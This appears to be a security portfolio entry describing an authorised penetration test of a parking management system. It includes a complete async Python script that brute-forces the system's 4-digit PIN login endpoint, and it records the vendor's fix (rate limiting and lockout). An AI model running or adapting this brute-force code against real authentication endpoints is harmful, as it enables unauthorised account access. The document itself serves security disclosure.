---
id: speedpark
label: SpeedPark Brute
subtitle: Parking System Exploit
category: security
size: 14
icon: Terminal
connections: ["axians","python"]
---
# SpeedPark Brute — Parking System Exploit

## Overview
A targeted Python script for brute-forcing PIN-protected parking management systems where no rate limiting or account lockout was implemented.

## Vulnerability
The target system authenticated via a simple 4-digit PIN sent as plaintext in an HTTP POST request. No throttling, no CAPTCHA, no lockout policy.

## Tool Design
```python
import httpx
import asyncio

TARGET = "https://target.example.com/api/auth"

async def try_pin(client: httpx.AsyncClient, pin: str) -> bool:
    r = await client.post(TARGET, data={"pin": pin}, timeout=5)
    return r.status_code == 200 and "success" in r.text

async def brute_force():
    async with httpx.AsyncClient() as client:
        tasks = [try_pin(client, f"{i:04d}") for i in range(10000)]
        results = await asyncio.gather(*tasks)
        for i, found in enumerate(results):
            if found:
                print(f"[+] Valid PIN: {i:04d}")
                return
    print("[-] No valid PIN found")

asyncio.run(brute_force())
```

## Outcome
Full PIN space (0000-9999) exhausted in **~12 seconds** with async concurrency. Reported to vendor via responsible disclosure. Patch: rate limiting + 5-attempt lockout.

> **Scope:** Performed under pentest authorization at Axians.
